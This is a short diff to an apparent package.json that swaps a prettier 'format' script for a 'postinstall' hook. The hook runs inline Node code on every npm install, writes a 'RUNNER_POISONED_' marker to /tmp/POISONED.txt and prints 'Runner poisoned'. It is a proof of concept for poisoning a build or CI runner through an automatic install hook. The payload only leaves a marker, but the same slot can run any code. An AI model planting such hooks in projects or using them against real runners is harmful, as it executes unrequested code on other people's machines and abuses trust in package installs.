@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "main": "",
   "scripts": {
-    "format": "prettier . --write"
+    "postinstall": "node -e \"const fs=require('fs'); fs.writeFileSync('/tmp/POISONED.txt', 'RUNNER_POISONED_'+Date.now()); console.log('Runner poisoned');\""
   },
   "keywords": [],
   "author": "",
